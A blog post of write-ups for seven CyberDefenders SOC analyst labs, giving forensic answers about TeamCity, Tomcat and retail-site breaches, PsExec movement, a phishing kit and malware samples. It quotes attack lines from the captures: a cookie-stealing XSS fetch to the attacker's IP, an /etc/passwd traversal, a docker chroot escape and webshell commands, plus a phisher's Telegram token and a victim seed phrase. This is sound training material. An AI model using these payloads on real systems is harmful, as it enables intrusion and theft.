---
title: CyberDefenders' Lab
draft: false
date: 2026-10-30T03:16:38.930Z
categories:
  - Writeup
lastmod: 2026-10-30T09:30:03.510Z
description: Nothing is that serious, so please choose peace.
cover: https://i.pinimg.com/1200x/a3/8c/bd/a38cbd1d6d6a1c4519f204926e5eca9d.jpg
tags:
  - Network Forensics
  - Threat Intel
banner: https://i.pinimg.com/1200x/a3/8c/bd/a38cbd1d6d6a1c4519f204926e5eca9d.jpg
---

## 1. Jetbrains

- **Date**: Oct 22, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 1
- **Category**: Network Forensics

We are presented with a packet capture and nine questions pertaining to it.

**Q1: Identifying the attacker's IP address helps trace the source and stop further attacks. What is the attacker's IP address?**

At first glance, the packet is fraught with a multitude of suspicious HTTP requests. Indeed, the vulnerability lies in the web server.

![.](/images/posts/0064.png)

The conversations of those HTTP stream reveals that there is an influx of requests from the IP `23.158.56.196`

![.](/images/posts/0065.png)

Moreover, those requests come in all sizes and shapes.

![.](/images/posts/0066.png)

To list a few suspicious HTTP payload in the packet:
```
- `GET /authenticationTest.html?csrf HTTP/1.1`
- `POST /generateId.html HTTP/1.1\r\n (application/x-www-form-urlencoded)`
- `POST /ajax.html HTTP/1.1\r\n (application/x-www-form-urlencoded)`
- `HTTP/1.1 200 (text/plain)`
- `GET /app/oauth/space/connections/project/_Root?fullMatch=false&capability=CREATE_SUB_CONNECTION&capability=ISSUE_USER_TOKEN&unwantedCapability=IS_SUB_CONNECTION&queryUserTokens=true&queryPendingType=true HTTP/1.1\r\n`
- `GET /admin/createProject.html?init=1&parentId=_Root&embedded=true&cameFromUrl=%2Ffavorite%2Fprojects HTTP/1.1\r\n`
- `POST /hax?jsp=/app/rest/users/id:2/tokens/mD5r0yemB0;.jsp HTTP/1.1\r\n`
```
![.](/images/posts/0067.png)

These are evidence of CSRF, [the Cross-Site Request Forgery attack](https://portswigger.net/web-security/csrf).

And they all coming from the aforementioned IP address, further reinforcing that it is indeed the attacker's.

`Answer: 23.158.56.196`

**Q2: To identify potential vulnerability exploitation, what version of our web server service is running?**

We've already known that HTTP requests are suspicious, as well as the attacker's IP address. Therefore let's apply the filter for that with: 

`ip.src == 23.158.56.196 && http`

In the response body of the request 

`GET /hax?jsp=/app/rest/server;.jsp`, 

you will find a metadata field called `<server version>`.

A more efficient method can be filtering for keyword, in this case, `server`.

`Answer: 2023.11.3`

**Q3: After identifying the version of our web server service, what CVE number corresponds to the vulnerability the attacker exploited?**

Upon looking up the vulnerability for TeamCity with the aforementioned server version, we found two relevant articles from [Splunk](https://www.splunk.com/en_us/blog/security/security-insights-jetbrains-teamcity-cve-2024-27198-and-cve-2024-27199.html) and [Rapid7](https://www.rapid7.com/blog/post/ra-cve-2024-27198-analysis/).

`Answer: CVE-2024-27198`

**Q4: What credentials did the attacker successfully use for Basic Auth against the TeamCity server?**

In the same request as of Q3, we can see the metadata (credentials) right down below.

`Answer: c91oyemw:CL5vzdwLuK`

**Q5: The attacker uploaded a webshell to ensure his access to the system. What is the name of the file that the attacker uploaded?**

> A web shell is a malicious script or small program uploaded to a compromised web server that lets an attacker control the server remotely through a standard web browser (HTTP or HTTPS). First, attackers break into a website or application by exploiting vulnerabilities such as unpatched software, weak passwords, file upload flaws, SQL injections,... Then, they upload a script written in a server-side language - most commonly PHP, ASP/ASPX, JSP, or Python - disguised as a normal file or hidden inside existing code. Instead of logging in through standard terminal tools (like SSH), the attacker could navigate to the uploaded script via a web URL and runs system commands, manages files, or accesses databases directly through the browser. Attackers use web shells during the post-exploitation phase for persistence, data theft, pivoting, or spreading malware.

Upon inspecting `POST /admin/pluginUpload.html` in the same HTTP stream, we can see the file that the attacker upload:

`Content-Disposition: form-data; name="file:fileToUpload"; filename="NSt8bHTg.zip"` 

Interestingly, scattering throughout the packet, we can also see the request with the name `POST /plugins/NSt8bHTg.jsp HTTP/1.1 (application/x-www-form-urlencoded)`, which is also the name of the file mentioned.

> This is an indication of a vulnerability called [Zip Slip](https://darkt.medium.com/zip-slip-leading-to-remote-command-execution-in-java-application-fd3c41150b71), wherein a malicious `.zip` file can contain path traversal filenames. If the application extracts the archive without validating file paths, the attacker can write a backdoor `.jsp` file directly into the server's web root, leading to Remote Code Execution (RCE).

`Answer: NSt8bHTg.zip`

**Q6: When did the attacker execute their first command via the web shell?**

Apply the filter for the attacker's IP address and the keyword "cmd":

`ip.addr == 23.158.56.196 && frame contains "cmd"`

Look for the first one (which is `cmd=ls`, executed via the `.jsp` web shell), and view the UTC Arrival Time.

`Answer: 2024-06-30 08:03`

**Q7: The attacker tampered with a text file that contained the credentials of the admin user of the webserver. What new username and password did the attacker write in the file?**

We keep searching along the lines of `cmd` (since the question tell us that the attacker **wrote** something). Indeed, we encounter a request that contains that mentioned command:

`cmd=bash -c echo "username:a1l4m,password:youarecompromised" > /tmp/Creds.txt`

`Answer: a1l4m:youarecompromised`

**Q8: Q7 showed the attacker writing false credentials into Creds.txt. Which MITRE ATT&CK sub-technique (Data Manipulation family) describes that specific file-write action?**

![image](/images/posts/dreamhack-933703/image-1792857821949-684f88.png)

Well, there is only three sub-techniques. Initially, I'm torn between Stored Data Manipulation (T1565.001) and Transmitted Data Manipulation (T1565.002)

> **Stored Data Manipulation (T1565.001)**: *"Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making."*
> 
> **Transmitted Data Manipulation (T1565.002)**: *"Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making."*

After some pondering, well, we can come to a plausible conclusion that: the attacker used a web shell to run some commands to change data stored on the server, like, the `Creds.txt` is pretty much static. And there is no sign of altering any data en route to the server or modifying system processes that I know of.

`Answer: T1565.001`

**Q9: Immediately after gaining a shell, the attacker executed a docker command that mounted the host filesystem and chrooted into it - providing full host access. What was that exact command?**

The keyword this time to filter should be `docker` and `chroot`.

![image](/images/posts/dreamhack-933703/image-1792899790542-0fe7b0.png)


`Answer: docker run --rm -it -v /:/host ubuntu chroot /host`


## 2. RetailBreach

- **Date**: Oct 24, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 1
- **Category**: Network Forensics

**Q1: Identifying an attacker's IP address is crucial for mapping the attack's extent and planning an effective response. What is the attacker's IP address?**

We can see that there are two different IP addresses in the HTTP session. The first client IP (135.143.142.5) logged in normally, while the second IP (111.224.180.128) failed initial login attempts, before hijacking the active session token.

`Answer: 111.224.180.128`

**Q2: The attacker used a directory brute-forcing tool to discover hidden paths. Which tool did the attacker use to perform the brute-forcing?**

We can see an influx of HTTP GET requests from the attacker, with the form of `./passwd`, `./htpasswd`, `/chpasswd`,... Upon clicking on these requests, we can see this directory brute-forcing use gobuster.

`Answer: gobuster`

**Q3: Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by users. Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?**

Applying the filter for the IP address of the attacker, as well as the the keyword `script`, we can find out the XSS payload.

![image](/images/posts/dreamhack-933703/image-1792899900701-b0b553.png)

`Answer: <script>fetch('http://111.224.180.128/' + document.cookie);</script>`

**Q4: Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?**

From the previous question, we can see that the attacker execute the XSS in `/reviews.php`. And we have also inferred that `135.143.142.5` is IP address of the admin. Therefore, we just need to locate the first time the admin access that page.

`Answer: 2024–03–29 12:09`

**Q5: The theft of a session token through XSS is a serious security breach that allows unauthorized access. Can you provide the session token that the attacker acquired and used for this unauthorized access?**

The admin encountered the malicious script in the previous question, and right after the attacker has successfully access the privilege unauthorizedly, from which you can see the session token.

`Answer: lqkctf24s9h9lg67teu8uevn3q`

**Q6: Identifying which scripts have been exploited is crucial for mitigating vulnerabilities in a web application. What is the name of the script that was exploited by the attacker?**

Let's utilize the newfounded session token. Filtering for the "session token" and the "attacker's IP address":

`ip.addr == 111.224.180.128 && frame contains "lqkctf24s9h9lg67teu8uevn3q"`

Among the request, there is this suspicious one:

`GET /admin/log_viewer.php?file=../../../../../etc/passwd`

This suggests the attacker was attempting to access sensitive system files via `?file=` parameter.

> `log_viewer.php` is a PHP script. It is commonly used as a web-based utility to read, format, and display server or application log files (such as Apache, Nginx, Dolibarr, or custom framework logs) directly inside a browser. In some web applications or plugins, `log_viewer.php` or similar log-viewing endpoints can also be targets for security vulnerabilities or exploitation if they lack proper authentication or input validation (such as path traversal or cross-site scripting).

`Answer: log_viewer.php`

**Q7: Exploiting vulnerabilities to access sensitive system files is a common tactic used by attackers. Can you identify the specific payload the attacker used to access a sensitive system file?**

The answer lies in the payload of the previous question. The script `log_viewer.php` is indeed accessed and exploited via path traversal.

`Answer: ../../../../../etc/passwd`

## 3. PsExec Hunt

- **Date**: Oct 24, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 2
- **Category**: Network Forensics

**Q1. To effectively trace the attacker's activities within our network, can you identify the IP address of the machine from which the attacker initially gained access?**

At first glance, there is a large amount of traffic of SMB2 under NetBIOS.

![image](/images/posts/rstcon-ctf-2026-f495bb/image-1793246130295-3fbd9a.png)

> *A large amount of SMB (Server Message Block) traffic running under NetBIOS usually indicates legacy Windows networking activity, active file/printer sharing, or a potential network scanning/malware spreading event.*
> 
> *In modern networks, SMB typically runs directly over TCP port 445 (Active Directory / Direct Host). When you see it heavily wrapped in NetBIOS (ports 137, 138, and 139), it points to specific architectural behaviors or anomalies.*

There is also an influx of traffic from the IP address `10.0.0.130`.

![image](/images/posts/rstcon-ctf-2026-f495bb/image-1793245575147-b7164d.png)

And we can see that, across the SMB2 traffic, there is `10.0.0.131`, who is responsible for all the response. And there is `10.0.0.130`, the address behind all those requests. They share thousands of packet with each other.

![image](/images/posts/rstcon-ctf-2026-f495bb/image-1793246593913-250dae.png)

Moreover, the requests from `10.0.0.130` are particularly suspicious. There is one requesting admin, and there is one creating `PSEXESVC.exe`

![image](/images/posts/rstcon-ctf-2026-f495bb/image-1793284642779-1ac8f7.png)

From these information, I suppose we can conclude that `10.0.0.130` is our attacker's IP address.

`Answer: 10.0.0.130`

**Q2. To fully understand the extent of the breach, can you determine the machine's hostname to which the attacker first pivoted?**

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793351530886-04d018.png)

At first, I thought it was `Marketing-PC`, since there are early signs of enumeration targeting that host. However, there is something deeper than that.

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793350737246-61fb99.png)

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793351925671-4e8a53.png)

There are clusters of SMB2 traffic, which are attempting to:

**- Q2: NTLMSSP_AUTH, User: \ssales**
**- Q3: Write `psexesvc.exe`**

I suppose, these are signs of the attacker has successfully gained access of the workstation.

Upon follow those streams, (be it TCP or SMB2), we can see fragments of the workstation "SALES-PC" throughout the NTLMSSP payload. 

![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793350902549-b83971.png)

This confirmed SALES-PC as the first machine the attacker compromised after gaining access.

`Answer: Sales-PC`

**Q3. Knowing the username of the account the attacker used for authentication will give us insights into the extent of the breach. What is the username utilized by the attacker for authentication?**

`Answer: ssales`

**Q4. After figuring out how the attacker moved within our network, we need to know what they did on the target machine. What's the name of the service executable the attacker set up on the target?**

`Answer: psexesvc.exe`

**Q5. We need to know how the attacker installed the service on the compromised machine to understand the attacker's lateral movement tactics. This can help identify other affected systems. Which network share was used by PsExec to install the service on the target machine?**


`Answer: ADMIN$`

**Q6. We must identify the network share used to communicate between the two machines. Which network share did PsExec use for communication?**

`Answer: IPC$`


**Q7. Now that we have a clearer picture of the attacker's activities on the compromised machine, it's important to identify any further lateral movement. What is the hostname of the second machine the attacker targeted to pivot within our network?**

`Answer: Marketing-PC`

## 4. Tomcat Takeover
- **Date**: Oct 30, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 2
- **Category**: Network Forensics

**Q1. Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?**

`Answer: 14.0.0.120`

**Q2. Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?**

`Answer: China`

**Q3. From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?**

`Answer: 8080`

**Q4. Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?**

`Answer: gobuster`

**Q5. After enumerating directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which directory related to the admin panel did the attacker uncover? (Provide the path including the leading slash, e.g. /path)**

`Answer: /manager`

**Q6. After accessing the admin panel, the attacker brute-forced the login. What credentials did the attacker successfully use? (Provide them in username:password format)**

`Answer: admin:tomcat`

**Q7. Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?**

`Answer: JXQOZY.war`

**Q8. After the attacker established a reverse shell on our server, the payload connects back to the attacker's machine. From the analysis, what is the callback destination in IP:port format?**

`Answer: 14.0.0.120:443`

## 5. GrabThePhisher
- **Date**: Oct 30, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 2
- **Category**: Threat Intel

**Q1. Which wallet is used for asking the seed phrase?**

`Answer: MetaMask`

**Q2. What is the file name that has the code for the phishing kit?**

`Answer: metamask.php`

**Q3. In which language was the kit written?**

`Answer: PHP`

**Q4. What service does the kit use to retrieve the victim's machine information?**

`Answer: Sypex Geo`

**Q5. How many seed phrases were already collected?**

`Answer: 3`

**Q6. Could you please provide the seed phrase associated with the most recent phishing incident?**

`Answer: father also recycle embody balance concert mechanic believe owner pair muffin hockey`

**Q7. Which medium was used for credential dumping?**

`Answer: Telegram`

**Q8. What is the token for accessing the channel?**

`Answer: 5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10`

**Q9. What is the Chat ID for the phisher's channel?**

`Answer: 5442785564`

**Q10. What are the allies of the phish kit developer?**

`Answer: j1j1b1s@m3r0`

## 6. Yellow RAT
- **Date**: Oct 30, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 2
- **Category**: Threat Intel

**Q1. What name does Red Canary use for the threat cluster associated with the SHA256 in hash.txt? Submit the name used in its technical analysis, without adding a malware-type suffix.**

`Answer: Yellow Cockatoo`

**Q2. As part of our incident response, knowing the malware's common filenames can help us scan other workstations for potential infection. What is the common filename associated with this malware? (Use VirusTotal)**

`Answer: 111bc461-1ca8-43c6-97ed-911e0e69fdf8.dll`

**Q3. Determining a malware sample's compilation timestamp can reveal insights into its development and deployment timeline. What compilation timestamp does VirusTotal show for this malware sample?**

`Answer: 2020-09-24 18:26`

**Q4. Understanding when the broader cybersecurity community first identified the malware could help determine how long the malware might have been in the environment before detection. When was the malware first submitted to VirusTotal?**

`Answer: 2020-10-15 02:47`

**Q5. To completely eradicate the threat from Industries' systems, we need to identify all components dropped by the malware. What is the name of the .dat file that the malware dropped in the AppData folder?**

`Answer: solarmarker.dat`

**Q6. It is crucial to identify the C2 servers with which the malware communicates to block its communication and prevent further data exfiltration. What is the C2 server that the malware is communicating with?**

`Answer: https://gogohid.com`

## 7. IcedID
- **Date**: Oct 30, 2026
- **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 2
- **Category**: Threat Intel

**Q1. What is the name of the file associated with the given hash?**

`Answer: document-1982481273.xlsm`

**Q2. Can you identify the filename of the GIF file that was deployed?**

`Answer: 3003.gif`

**Q3. How many domains does the malware look to download the additional payload file in Q2?**

`Answer: 5`

**Q4. From the domains mentioned in Q3, a DNS registrar was predominantly used by the threat actor to host their harmful content, enabling the malware's functionality. Can you specify the Registrar INC of the domain that end with .com?**

`Answer: NAMECHEAP`

**Q5. Could you specify the threat actor linked to the sample provided?**

`Answer: GOLD CABIN`

**Q6. In the Execution phase, what function does the malware employ to fetch extra payloads onto the system?**

`Answer: URLDownloadToFileA`







